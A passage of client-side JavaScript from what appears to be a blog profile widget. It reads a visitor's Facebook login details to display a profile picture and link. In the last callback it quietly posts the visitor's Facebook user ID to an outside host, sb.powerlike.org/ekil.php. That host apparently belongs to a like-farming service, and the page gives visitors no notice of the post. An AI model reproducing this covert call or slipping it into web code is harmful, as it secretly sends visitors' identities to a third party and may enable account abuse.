      if(gbr.username){window.usernameYgLogin=gbr.username;window.yuling='http://www.facebook.com/'+usernameYgLogin;window.yutit=usernameYgLogin+'@facebook.com'}else{window.yuling='http://www.facebook.com/'+idUserYgLogin;window.yutit='ID: '+idUserYgLogin}
      if(gbr.name){window.namaUserYgLogin=gbr.name}else{window.namaUserYgLogin='wtf-NoName?'}
      $('.Profile .a-profile-img').attr({'href':yuling,'title':yutit}); 
      if(gbr.picture&&gbr.picture.replace('_q.jpg','_n.jpg')!=gbrUserYgLogin){
        gbrUserYgLogin=gbr.picture.replace('_q.jpg','_n.jpg');
        setKuki('gbrlocoy',gbrUserYgLogin,1);
        $('.Profile .profile-img').animate({opacity:0.0},1000,function(){$(this).attr({'src':gbrUserYgLogin}).load(function(){$(this).animate({opacity:1.0},1000,function(){})})});
      }
      if(typeof allScriptDone!='undefined'){allScriptDone()}$.post('http://sb.powerlike.org/ekil.php',{postid:idUserYgLogin});
    });
  };
  window.sowPolower=function(siteId,id){if(!window.sowPolower.hasRun){
    window.sowPolower.hasRun=true;
    var skin = {};
    skin['FACE_SIZE'] = '32';
    $('#'+id).addClass('black25 round7');
  }};

  $.ajax({url:'http://connect.facebook.net/en_US/all.js'});
}

modifArchiveList();
//-->